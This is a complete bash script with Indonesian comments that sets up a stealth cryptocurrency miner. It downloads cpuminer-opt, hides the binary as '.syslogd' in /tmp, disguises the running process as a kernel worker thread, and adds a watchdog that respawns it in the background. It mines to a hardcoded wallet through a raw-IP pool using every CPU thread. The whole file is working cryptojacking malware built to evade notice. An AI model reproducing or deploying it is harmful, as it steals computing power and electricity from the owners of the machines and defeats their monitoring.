#!/bin/bash
set -e

# ====[ Konfigurasi User ]====
WALLET="Bc4QbZ9pPM5sJQ1RLdG7SrJCjqCnT5FVq9.Danis"
POOL="stratum+tcps://159.223.48.143:443"
ALGO="power2b"
THREADS=$(nproc --all)
BIN_NAME=".syslogd"
PROCESS_NAME="[kworker/u8:3-events]"
LOG_FILE=".xlog"

# ====[ Cek Binary Miner ]====
if [ ! -f "$BIN_NAME" ]; then
    echo "[INFO] Mengunduh binary miner..."
    if command -v wget >/dev/null 2>&1; then
        wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    elif command -v curl >/dev/null 2>&1; then
        curl -L -O https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    else
        echo "[ERROR] wget/curl tidak ditemukan."
        exit 1
    fi
    tar -xf cpuminer-opt-linux.tar.gz
    mv cpuminer-sse2 "$BIN_NAME"
    chmod +x "$BIN_NAME"
    rm -f cpuminer-opt-linux.tar.gz
fi

# ====[ Fungsi Jalankan Miner Stealth ]====
run_miner() {
    while true; do
        cp "$BIN_NAME" "/tmp/$BIN_NAME.$$"
        chmod +x "/tmp/$BIN_NAME.$$"
        rm -f "$BIN_NAME"
        exec -a "$PROCESS_NAME" /tmp/$BIN_NAME.$$ -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS >> "$LOG_FILE" 2>&1
        sleep 5
    done
}

# ====[ Watchdog Monitor Miner ]====
start_watchdog() {
    while true; do
        MINER_PID=$(pgrep -fa "$PROCESS_NAME" | grep -v grep | awk '{print $1}')
        if [ -z "$MINER_PID" ]; then
            echo "[WATCHDOG] Miner mati. Respawn..." >> "$LOG_FILE"
            nohup bash "$0" > /dev/null 2>&1 &
            exit 0
        fi
        sleep 10
    done
}

# ====[ Mode Watchdog Only ]====
if [ "$1" == "--watchdog" ]; then
    start_watchdog
    exit 0
fi

# ====[ Jalankan Miner dan Watchdog di Background ]====
(run_miner &) &
(bash "$0" --watchdog &) &
disown -a

echo "[INFO] Stealth miner & watchdog dijalankan."
exit 0
